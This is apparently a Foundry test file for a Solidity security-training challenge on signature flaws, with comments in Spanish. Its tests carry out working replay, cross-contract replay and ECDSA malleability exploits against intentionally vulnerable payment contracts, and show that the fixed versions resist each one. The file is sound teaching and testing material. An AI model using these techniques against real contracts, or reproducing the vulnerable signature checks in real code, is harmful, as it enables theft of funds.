// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {BaseChallenge} from "./base/BaseChallenge.t.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {PagosVulnerable, PagosMaleableVulnerable} from "../src/C6-firmas/Vulnerable.sol";
import {PagosSeguro, PagosMaleableFixed} from "../src/C6-firmas/Fixed.sol";

contract C6_Firmas is BaseChallenge {
    // Orden del grupo secp256k1 (para construir la firma maleable gemela).
    uint256 internal constant N =
        0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    address internal firmante;
    uint256 internal pk;

    function setUp() public override {
        super.setUp();
        (firmante, pk) = makeAddrAndKey("firmante");
    }

    // Variante A: replay (reto principal)

    function test_Exploit_Vulnerable() public {
        vm.prank(deployer);
        PagosVulnerable pagos = new PagosVulnerable{value: 3 ether}(firmante);

        // El firmante autoriza UNA retirada de 1 ETH al atacante.
        bytes32 hash = keccak256(abi.encodePacked(attacker, uint256(1 ether)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, hash);

        // Sin nonce: la misma firma vale infinitas veces. El atacante la reenvía
        // hasta vaciar el contrato.
        pagos.retirar(attacker, 1 ether, v, r, s);
        pagos.retirar(attacker, 1 ether, v, r, s);
        pagos.retirar(attacker, 1 ether, v, r, s);

        assertTrue(pagos.isSolved(), "el contrato queda vacio por replay");
        assertEq(attacker.balance, 13 ether, "el atacante cobra 3 veces 1 ETH");
    }

    function test_Fixed_Resiste() public {
        vm.prank(deployer);
        PagosSeguro pagos = new PagosSeguro{value: 3 ether}(firmante);

        bytes32 d = pagos.digest(attacker, 1 ether, 0);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, d);
        bytes memory sig = abi.encodePacked(r, s, v);

        // La primera retirada (nonce 0) funciona.
        pagos.retirar(attacker, 1 ether, 0, sig);
        // El replay con la misma firma (mismo nonce) revierte.
        vm.expectRevert(bytes("firma ya usada"));
        pagos.retirar(attacker, 1 ether, 0, sig);

        assertFalse(pagos.isSolved(), "no se puede vaciar por replay");
        assertEq(address(pagos).balance, 2 ether, "solo salio 1 ETH");
    }

    // Variante A: replay en otro contrato (falta de dominio)

    /// @notice Sin dominio, una firma emitida para un contrato vale en cualquier
    /// otro que confíe en el mismo firmante (otra instancia, otra cadena).
    function test_Exploit_ReplayOtroContrato_Vulnerable() public {
        vm.startPrank(deployer);
        PagosVulnerable pagosA = new PagosVulnerable{value: 3 ether}(firmante);
        PagosVulnerable pagosB = new PagosVulnerable{value: 3 ether}(firmante);
        vm.stopPrank();

        // El firmante autoriza 1 ETH pensando solo en el contrato A.
        bytes32 hash = keccak256(abi.encodePacked(attacker, uint256(1 ether)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, hash);
        pagosA.retirar(attacker, 1 ether, v, r, s);

        // La misma firma se acepta en el contrato B: nada la ata al contrato A.
        pagosB.retirar(attacker, 1 ether, v, r, s);
        assertEq(address(pagosB).balance, 2 ether, "la firma de A se cobra en B");
    }

    /// @notice El dominio EIP-712 incluye address(this) y block.chainid: la firma
    /// emitida para un contrato no vale en otro ni en otra cadena.
    function test_Fixed_Dominio_Resiste() public {
        vm.startPrank(deployer);
        PagosSeguro pagosA = new PagosSeguro{value: 3 ether}(firmante);
        PagosSeguro pagosB = new PagosSeguro{value: 3 ether}(firmante);
        vm.stopPrank();

        bytes32 d = pagosA.digest(attacker, 1 ether, 0);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, d);
        bytes memory sig = abi.encodePacked(r, s, v);

        // Otro contrato con el mismo firmante: el digest es distinto y la firma
        // recupera otra dirección.
        vm.expectRevert(bytes("firma invalida"));
        pagosB.retirar(attacker, 1 ether, 0, sig);

        // Misma dirección de contrato en otra cadena (bifurcación): EIP712 de
        // OpenZeppelin recalcula el dominio con el chainid real.
        uint256 cadenaOriginal = block.chainid;
        vm.chainId(cadenaOriginal + 1);
        vm.expectRevert(bytes("firma invalida"));
        pagosA.retirar(attacker, 1 ether, 0, sig);

        // En su contrato y su cadena, la firma sí es válida.
        vm.chainId(cadenaOriginal);
        pagosA.retirar(attacker, 1 ether, 0, sig);
        assertEq(address(pagosA).balance, 2 ether, "la firma vale solo en su dominio");
        assertEq(address(pagosB).balance, 3 ether, "el contrato B no pierde nada");
    }

    // Variante B: maleabilidad

    function test_Exploit_Maleabilidad_Vulnerable() public {
        vm.prank(deployer);
        PagosMaleableVulnerable pagos = new PagosMaleableVulnerable{value: 2 ether}(firmante);

        bytes32 hash = keccak256(abi.encodePacked(attacker, uint256(1 ether)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, hash);

        // Primera retirada con la firma canónica.
        pagos.retirar(attacker, 1 ether, v, r, s);

        // Firma gemela maleable: s' = n - s, v invertida. Otro hash de firma, pero
        // ecrecover la acepta igual: evade el guard por id de firma.
        bytes32 s2 = bytes32(N - uint256(s));
        uint8 v2 = v == 27 ? 28 : 27;
        pagos.retirar(attacker, 1 ether, v2, r, s2);

        assertTrue(pagos.isSolved(), "doble gasto por maleabilidad");
        assertEq(attacker.balance, 12 ether, "el atacante cobra 2 veces");
    }

    function test_Fixed_Maleabilidad_Resiste() public {
        vm.prank(deployer);
        PagosMaleableFixed pagos = new PagosMaleableFixed{value: 2 ether}(firmante);

        bytes32 hash = keccak256(abi.encodePacked(attacker, uint256(1 ether)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, hash);
        bytes memory sig = abi.encodePacked(r, s, v);

        pagos.retirar(attacker, 1 ether, sig); // canónica (s bajo): OK

        // Gemela maleable (s alto): ECDSA de OpenZeppelin la rechaza.
        bytes32 s2 = bytes32(N - uint256(s));
        uint8 v2 = v == 27 ? 28 : 27;
        bytes memory sigMaleable = abi.encodePacked(r, s2, v2);
        vm.expectRevert(abi.encodeWithSelector(ECDSA.ECDSAInvalidSignatureS.selector, s2));
        pagos.retirar(attacker, 1 ether, sigMaleable);

        assertFalse(pagos.isSolved(), "no hay doble gasto");
        assertEq(address(pagos).balance, 1 ether, "solo salio 1 ETH");
    }
}
